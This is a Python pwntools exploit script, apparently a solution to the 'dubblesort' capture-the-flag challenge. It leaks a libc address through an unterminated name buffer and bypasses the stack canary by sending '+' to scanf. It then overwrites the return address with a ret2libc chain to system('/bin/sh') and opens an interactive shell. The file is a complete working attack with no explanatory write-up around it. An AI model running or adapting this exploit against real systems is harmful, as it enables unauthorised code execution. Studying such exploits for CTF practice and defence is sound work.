#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

elf  = ELF('./dubblesort')
libc = ELF('/usr/lib32/libc-2.32.so')

# Memory locations
bin_sh = elf.bss() + 0x100

# Byte sequence alias
A4 = 4 * b'A'


def main():
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    raw_input()

    # Develop your exploit here
    proc.recvuntil('What your name :')
    proc.send(A4 * 4)

    proc.recvuntil('Hello ' + 'AAAA' * 4)
    libc__exit_funcs_lock = u32(proc.recv(4))
    libc_base = libc__exit_funcs_lock - libc.sym['__exit_funcs_lock']
    libc_system = libc_base + libc.sym['system']
    libc_bin_sh = libc_base + list(libc.search(b'/bin/sh'))[0]

    log.info('__exit_funcs_lock@libc: {}'.format(hex(libc__exit_funcs_lock)))
    log.info('libc base: {}'.format(hex(libc_base)))
    log.info('system@libc: {}'.format(hex(libc_system)))
    log.info('bin_sh@libc: {}'.format(hex(libc_bin_sh)))

    proc.recvuntil('sort :')
    proc.sendline(str(35).encode())


    # We must make sure our payload will remain
    # in the correct order after being sorted.
    payload = [0x30678 if i < 24 else 0xf0000000 for i in range(32)]
    payload.append(libc_system)  # ret
    payload.append(libc_bin_sh)  # system()'s ret addr
    payload.append(libc_bin_sh)  # system()'s 1st arg

    for i in range(35):
        proc.recvuntil('number : ')
        # b'+' will be ignored by scanf("%u")
        proc.sendline(b'+' if i == 24 else str(payload[i]).encode())

    proc.interactive()


if __name__ == '__main__':
    main()
